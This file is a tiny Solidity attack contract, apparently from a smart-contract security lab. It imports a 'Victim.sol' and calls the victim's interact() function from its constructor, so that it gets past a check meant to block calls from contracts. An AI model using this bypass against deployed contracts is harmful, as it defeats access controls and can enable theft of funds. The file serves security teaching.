// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Victim.sol";

contract ContractCheckerAttacker {
    ContractChecker checker;

    constructor(address _checkerAddress) {
        checker = ContractChecker(_checkerAddress);
        checker.interact();
    }
}
